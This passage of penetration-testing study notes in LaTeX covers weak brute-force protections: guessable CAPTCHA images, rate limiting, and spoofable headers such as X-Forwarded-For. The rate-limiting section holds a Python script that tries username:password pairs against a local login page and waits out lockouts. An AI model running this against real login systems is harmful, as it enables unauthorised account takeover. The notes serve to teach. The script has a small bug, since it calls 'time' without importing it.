
\section{Weak bruteforce protactions}
\subsection{CAPTCHA}
It is also possible for developers to use a custom or weak implementation of
CAPTCHA, where for example, the name of the image is made up of the chars
contained within the image. Having weak protections is often worse than having
no protection since it provides a false sense of security. The image below
shows a weak implementation where the PHP code places the image's content into
the id field. This type of weak implementation is rare but not unlikely.


\subsection{Rate Limiting}
\begin{verbatim}
import requests

userpass_file = "userpass.txt"
url = "http://127.0.0.1/login.php"
lock_time = 30
lock_message = "Too many failures"

with open(userpass_file, "r") as fh:
    for fline in fh:
        if fline.startswith("#"):
            continue
        username = fline.split(":")[0]
        password = ":".join(fline.split(":")[1:])
        data = {
            "user": username,
            "pass": password
        }
        res = requests.post(url, data=data)
        if "Invalid credentials" in res.text:
            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
        elif "Access granted" in res.text:
            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
        elif lock_message in res.text:
            print("[-] Hit rate limit, sleeping 30")
            time.sleep(lock_time+0.5)
\end{verbatim}

\subsection{Insufficient Protections}
hen an attacker can tamper with data taken into consideration to increase
security, they can bypass all or some protections. For example, changing the
\verb+User-Agent+ header is easy. Some web applications or web application
firewalls leverage headers like \verb+X-Forwarded-For+ to guess the actual
source IP address. This is done because many internet providers, mobile
carriers, or big corporations usually “hide” users behind NAT. Blocking an IP
address without the help of a header like \verb+X-Forwarded-For+ may result in
blocking all users behind the specific NAT.
